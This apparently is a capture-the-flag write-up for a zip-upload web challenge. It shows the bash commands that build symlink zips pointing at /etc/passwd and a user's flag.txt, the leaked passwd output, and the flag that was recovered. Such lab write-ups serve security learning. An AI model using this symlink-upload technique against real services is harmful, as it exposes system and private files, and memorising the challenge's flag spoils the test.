
### Challenge overview

In this challenge, we encounter a file upload feature designed for handling zip files. Upon successful upload, the contents of the zip file are extracted and displayed. Initial attempts to upload PHP and Python scripts failed, as they were merely reflected as plain text without execution.

### Exploiting Zip-Slip Vulnerability
Upon researching vulnerabilities associated with zip file uploads, we came across the concept of `zip-slips`. Zip-slip involves uploading symbolic links to server files, potentially allowing access to server files if proper validation measures are not implemented prior to file reflection.


First, we attempted to read the `/etc/passwd` file by creating a symlink and uploading it as a zip file:


``` bash
/Desktop$ ln -s ../../../../etc/passwd  sym1
/Desktop$ zip --symlinks sym1.zip sym1
```
- Its worked and reflected this:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
copenhagen:x:1000:1000::/home/copenhagen:/bin/sh
```

In the challenge description we're told that flag is located in home directory of some user, and in the last line we can see that `copenhagen` is a user.
So let's try reading flag from it's home directory:
``` bash
/Desktop$ ln -s ../../../../home/copenhagen/flag.txt  sym2
/Desktop$ zip --symlinks sym2.zip sym2
```
 Uploading this zip file, we're able to read the flag:\
 `utflag{No_Observable_Cats_Were_Harmed}`